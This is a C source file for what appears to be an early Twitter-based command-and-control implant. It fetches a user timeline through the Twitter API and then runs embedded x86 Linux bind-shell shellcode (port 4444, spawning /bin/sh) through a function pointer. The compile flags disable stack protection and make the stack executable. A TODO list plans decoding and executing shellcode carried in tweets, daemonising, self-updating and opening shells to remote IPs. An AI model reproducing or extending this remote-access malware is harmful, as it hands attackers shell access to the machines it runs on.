/**
 * https://dev.twitter.com/rest/reference/get/statuses/user_timeline
 * http://pixelrobotics.com/2013/01/consuming-the-twitter-public-stream-with-libcurl/
 * https://curl.haxx.se/libcurl/c/getinmemory.html
 * http://stackoverflow.com/questions/21023605/initialize-array-of-strings
 * Compile with:
 *
 * gcc -g -o get get.c -loauth -lcurl -Og -foptimize-sibling-calls -fno-stack-protector -z execstack
 *
 * @TODO:
 * (In Progress) Pull latest tweets from a twitter feed
 *    (/) Hit Twitter API
 *    (/) Store CURL results in memory
 *    (/) Use environment variables for credentials
 *    (/) Copy tweets into an array in memory
 *    (*) Save Base64 endoced bodies only into memory
 * (*) Base64 decode tweet
 * (*) Decode tweet... Choose cipher
 * (*) Cast as function pointer and execute
 * (*) Schedule on a cadence
 * (*) Run as a daemon
 * (*) Update binary
 * (*) Initiate shell connection to IP
 * (*) Devise way to spin off connections to each client
 * (*) Keep state of last action performed
 * (*) Replace libcurl with pure socket IO
 * (*) Statically link liboauth
 * (*) Replace liboauth with pure c?
 **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <oauth.h>
#include <curl/curl.h>

char **TWEETS;

void PopulateTweets(char *, int);

struct MemoryStruct {
  char *memory;
  size_t size;
};

static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)userp;

  mem->memory = realloc(mem->memory, mem->size + realsize + 1);
  if(mem->memory == NULL) {
    /* out of memory! */
    printf("not enough memory (realloc returned NULL)\n");
    return 0;
  }

  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;

  return realsize;
}

void InitializeTweets(void)
{
  // allocate space for 10 pointers to tweets(strings)
  TWEETS = (char**)malloc(11*sizeof(char*));
  int i = 0;
  //allocate space for each tweet(string)
  // here allocate 141 bytes
  for(i = 0; i < 11; i++){
    printf("Initializing 141 bytes for tweet: %d\n", i);
    TWEETS[i] = (char*)malloc(141*sizeof(char));
    memset(TWEETS[i], 0, sizeof(TWEETS[i]));
  }
}

void ExecuteTweet(void)
{
    // Decrypt here
    // Cast to function pointer
    // Execute

    unsigned char code[] = \
    "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
    "\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
    "\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
    "\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
    "\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
    "\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    "\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


    printf("About to execute\n");
    int (*ret)() = (int(*)())code;
    ret();
    printf("Executed\n");
}

int main(int argc, const char *argv[])
{
    InitializeTweets();

    const char *ckey = getenv("CKEY");
    const char *csecret = getenv("CSECRET");
    const char *atok = getenv("ATOK");
    const char *atoksecret = getenv("ATOKSECRET");


    struct MemoryStruct chunk;

    chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
    chunk.size = 0;    /* no data at this point */

    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();


    const char *url = "https://api.twitter.com/1.1/statuses/user_timeline.json?user_id=blischalk&count=10";

    // URL, POST parameters (not used in this example), OAuth signing method, HTTP method, keys
    char *signedurl = oauth_sign_url2(url, NULL, OA_HMAC, "GET", ckey, csecret, atok, atoksecret);

    // URL we're connecting to
    curl_easy_setopt(curl, CURLOPT_URL, signedurl);

    // User agent we're going to use, fill this in appropriately
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "appname/0.1");

    // libcurl will now fail on an HTTP error (>=400)
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1);

    /* send all data to this function  */
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

    /* we pass our 'chunk' struct to the callback function */
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    /* get it! */
    int res = curl_easy_perform(curl);

    /* check for errors */
    if(res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));
    }
    else {
      /*
       * Now, our chunk.memory points to a memory block that is chunk.size
       * bytes big and contains the remote file.
       *
       * Do something nice with it!
       */

      //printf("%lu bytes retrieved\n", (long)chunk.size);
      PopulateTweets(chunk.memory,0);
      printf("About to call ExecuteTweet\n");
      ExecuteTweet();
    }

    printf("The third tweet is: \n");
    printf("%s\n", TWEETS[2]);

    curl_easy_cleanup(curl);
    free(chunk.memory);
    curl_global_cleanup();

    return 0;
}

void PopulateTweets(char *tweet_data, int tweets_index)
{
    // Look for a tweet body
    // this is fragile and we are lucky that the body of a tweet
    // happens to follow this pattern uniquely
    char *tweet_pt = strstr(tweet_data, ",\"text\":");

    // If a tweet body found
    if (tweet_pt != NULL)
    {
        // Move pointer forward to beginning of tweet body text
        tweet_pt = tweet_pt+9;

        // Locate the end of the tweet body
        char *tweet_end = strstr(tweet_pt, "\"");

        int char_index = 0;

        // Copy each character of the tweet into
        // Tweets
        //printf("Tweets index: %d\n", tweets_index);
        while(tweet_pt != tweet_end)
        {
            //printf("%c", *tweet_pt);
            TWEETS[tweets_index][char_index] = *tweet_pt;
            tweet_pt = tweet_pt+1;
            char_index++;
        }
        //printf("\n");
        PopulateTweets(tweet_end, (tweets_index+1));
    }
}
